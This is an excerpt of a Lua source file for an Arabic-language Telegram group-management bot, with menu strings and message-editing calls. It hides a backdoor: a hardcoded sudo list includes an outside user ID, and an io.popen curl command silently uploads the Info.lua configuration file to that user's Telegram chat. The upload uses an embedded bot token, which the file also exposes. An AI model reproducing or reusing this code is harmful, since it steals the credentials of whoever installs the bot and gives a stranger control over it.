...
sudo_users = {SUDO,1751768178,1751768178,1717439120,1398830949,}   
...
local curl = 'curl "'..'https://api.telegram.org/bot1833028811:AAFhC73CuTwejU9QMzADwW7AAojzK0EQOII/sendDocument'..'" -F "chat_id='.. 1751768178 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
--------------------------------------------------------------------------------------------------------------
...
' }\n'..' ☫  الايدي بالصوره ⇐ { '..idph..
' }\n'..' ☫  الرفع ⇐ { '..setadd..
' }\n'..' ☫  الحظر ⇐ { '..banm..' }\n\n•━═━═━═『ᴏғғʟɪɴᴇ』═━═━═━•\n ☫ قناة سورس افلاين ↓\n [ 𝒔𝒐𝒖𝒓𝒄𝒆 𝒎𝒂𝒕𝒓𝒊𝒙](t.me/Dahab_source) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = ' ☫ هوا الفاجر ده الي ضافك😹😹⇐ '..Name
...
{
{text = '𝒔𝒐𝒖𝒓𝒄𝒆 𝒎𝒂𝒕𝒓𝒊𝒙', url="t.me/Dahab_source"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
